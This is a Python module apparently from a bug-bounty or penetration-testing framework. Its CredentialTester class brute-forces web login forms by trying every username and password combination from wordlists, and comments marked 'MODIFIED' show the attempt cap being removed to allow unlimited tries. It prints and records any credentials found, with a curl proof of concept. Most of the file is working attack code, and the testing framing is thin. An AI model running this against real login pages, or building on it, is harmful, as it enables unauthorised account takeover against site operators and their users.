import asyncio
from typing import List, Dict, Optional, Tuple
from core.base_module import BaseModule, Finding
from pathlib import Path
import itertools  # ← NEW: for all combinations


class CredentialTester(BaseModule):
    """Test for brute force vulnerabilities with stealth"""

    def __init__(self, config, stealth=None, db=None, graph_manager=None):
        super().__init__(config, stealth, db, graph_manager)
        # MODIFIED: None = unlimited attempts
        self.max_attempts   = config.get('max_attempts', None)
        self.delay          = config.get('delay_between', 0.5)
        self.wordlist_path  = config.get('wordlist_path', 'wordlists')
        self.stop_on_success = config.get('stop_on_success', True)

    # ... [keep all other methods the same until _test_brute_force] ...

    async def _test_brute_force(self, endpoint: Dict):
        """Test brute force with wordlists - ALL combinations, unlimited attempts"""
        url            = endpoint['url']
        fields         = endpoint.get('fields', {})
        username_field = fields.get('username_field', 'username')
        password_field = fields.get('password_field', 'password')

        self.logger.info(f"Starting brute force on {url}")
        
        usernames, passwords = self._load_wordlists()
        
        # MODIFIED: Calculate total combinations
        total_combinations = len(usernames) * len(passwords)
        self.logger.info(f"Total combinations: {total_combinations} ({len(usernames)} users × {len(passwords)} passwords)")
        
        if self.max_attempts is None:
            self.logger.info("🔓 UNLIMITED MODE: Will test ALL combinations")
        else:
            self.logger.info(f"Limit: {self.max_attempts} attempts")

        successful_logins = []
        rate_limited      = False
        attempt_count     = 0
        
        # MODIFIED: itertools.product generates ALL combinations
        # (user1, pass1), (user1, pass2), (user1, pass3)...
        # (user2, pass1), (user2, pass2), (user2, pass3)...
        credentials = itertools.product(usernames, passwords)
        
        for username, password in credentials:
            # Check limit only if max_attempts is set
            if self.max_attempts is not None and attempt_count >= self.max_attempts:
                self.logger.info(f"Reached limit: {self.max_attempts}")
                break

            attempt_count += 1
            login_data = {username_field: username, password_field: password}
            
            # Progress update every 10 attempts
            if attempt_count % 10 == 0:
                self.logger.info(f"Progress: {attempt_count}/{total_combinations} | Testing: {username}:{password}")

            try:
                response = await self._make_request(
                    url, method='POST', data=login_data, allow_redirects=True
                )

                if not response:
                    continue

                is_success = await self._check_login_success(response, url)

                if is_success:
                    # Success output
                    sep = "=" * 60
                    print(f"\n\033[91m{sep}\033[0m")
                    print(f"\033[92m[!!!] CREDENTIALS FOUND!\033[0m")
                    print(f"\033[92m      Username : {username}\033[0m")
                    print(f"\033[92m      Password : {password}\033[0m")
                    print(f"\033[92m      URL      : {url}\033[0m")
                    print(f"\033[92m      Attempt  : {attempt_count}/{total_combinations}\033[0m")
                    print(f"\033[91m{sep}\033[0m\n")

                    finding = Finding(
                        module='brute_force',
                        title=f'[CREDENTIALS FOUND] {username}:{password}',
                        severity='Critical',
                        description=f'Found after {attempt_count} attempts',
                        evidence={
                            'username': username,
                            'password': password,
                            'attempts': attempt_count,
                            'total_combinations': total_combinations
                        },
                        poc=f"curl -X POST '{url}' -d '{username_field}={username}&{password_field}={password}'",
                        remediation='Implement rate limiting, account lockout, and strong passwords',
                        cvss_score=9.8,
                        bounty_score=5000,
                        target=url
                    )
                    self.add_finding(finding)
                    
                    if self.stop_on_success:
                        return  # Stop after first find
                    else:
                        continue  # Keep testing

                # Rate limiting detection
                if response.status in [429, 503, 403]:
                    rate_limited = True
                    self.logger.info(f"Rate limited after {attempt_count} attempts")
                    break

            except Exception as e:
                self.logger.error(f"Error: {e}")

            await asyncio.sleep(self.delay)

        if not successful_logins and not rate_limited:
            self.logger.info(f"No credentials found after {attempt_count}/{total_combinations} attempts")
